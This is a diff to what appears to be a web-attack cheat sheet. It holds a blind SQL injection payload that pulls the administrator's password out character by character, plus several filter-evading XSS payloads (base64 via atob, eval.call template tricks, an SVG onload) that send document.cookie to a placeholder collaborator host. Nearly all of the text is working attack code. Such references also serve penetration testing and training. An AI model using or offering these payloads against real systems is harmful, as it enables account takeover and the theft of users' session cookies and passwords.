@@ -7,6 +7,7 @@
 
 -- Divides by 1 if true, 0 if not
 -- Used when a number (int) was in front of the query
+-- %2F = /, %2B = +, %2A = *, %2D = -
 %2F(CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+where+username+%3d+'administrator')%3d'a'+THEN+1+ELSE+0+END)
 ```
 
@@ -14,10 +15,12 @@
 
 ```js
 // No periods (.)
-"-fetch(atob('<base64-of-your-colaborator>'), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})-"
+fetch(atob('<base64-of-your-colaborator>'), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})
 
 // No parentheses
-"-eval.call`${"fetch\x28'<your-collaborator>', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
+eval.call`${"fetch\x28'<your-collaborator>', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`
+//  With base64 encoding
+eval.call`${atob`YWxlcnQoMSk=`}`
 
 // SVG to steal cookie
 '"><svg/onload=fetch(`//<your-collaborator>/cookie?=${encodeURIComponent(document.cookie)}`)>
